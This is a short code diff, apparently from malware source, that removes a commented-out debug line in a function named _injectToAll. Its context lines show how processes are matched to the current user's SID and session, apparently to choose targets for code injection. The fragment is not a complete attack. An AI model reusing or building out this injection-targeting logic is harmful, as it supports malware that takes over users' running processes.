@@ -70,7 +70,6 @@ bool _injectToAll(void)
 					    //We obtain the SID process and compare it with the SID current process.
 					    if((tu = Process::_getUserByProcessId(pe.th32ProcessID, &sessionId)) != NULL)
 					    {
-						    //WDEBUG2(WDDT_INFO, "sessionId=\"%u\", coreData.currentUser.id=\"%u\"", sessionId, coreData.currentUser.id);
 						    if(sessionId == coreData.currentUser.sessionId &&
 							    (sidLength = CWA(advapi32, GetLengthSid)(tu->User.Sid)) == coreData.currentUser.sidLength &&
 							    Mem::_compare(tu->User.Sid, coreData.currentUser.token->User.Sid, sidLength) == 0)
